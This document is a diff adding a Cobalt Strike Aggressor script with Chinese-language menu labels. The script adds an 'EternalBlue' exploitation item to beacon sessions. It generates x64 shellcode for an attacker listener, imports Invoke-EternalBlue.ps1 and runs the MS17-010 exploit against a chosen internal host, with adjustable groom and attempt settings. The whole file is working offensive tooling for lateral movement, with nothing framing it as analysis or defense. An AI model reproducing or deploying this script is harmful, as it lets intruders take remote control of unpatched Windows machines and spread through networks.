@@ -1,0 +1,30 @@
+#define functions
+
+
+
+sub ms17_010 {
+	$stager = transform(shellcode($3['listener'], false,"x64"),"array");
+	bpowershell_import!($bid, script_resource("script/Invoke-EternalBlue.ps1"));
+	bpowerpick($bid, "Invoke-EternalBlue -Target $3['Rhost'] $+  -Shellcode @($stager $+ ) -InitialGrooms $3['InitialGrooms'] $+  -MaxAttempts $3['MaxAttempts']");
+}
+
+
+
+
+
+#append menu
+
+
+    menu "漏洞利用"{
+        item "永恒之蓝"{
+            $bid = $1['@'];
+            $Dialog = dialog("永恒之蓝",%(Rhost => beacon_info($bid,"internal"), InitialGrooms => "12", MaxAttempts => "1", bid => $bid),&ms17_010);
+            dialog_description($Dialog, "使用PowerShell进行永恒之蓝攻击");
+            drow_text($Dialog, "Rhost",  "目标主机:");
+            drow_listener($Dialog, "listener", "监听器: ");
+            drow_text($Dialog, "InitialGrooms",  "初始Grooms:");
+            drow_text($Dialog, "MaxAttempts",  "最大尝试次数:");
+            dbutton_action($Dialog, "利用");
+            dialog_show($Dialog);
+        }
+    }
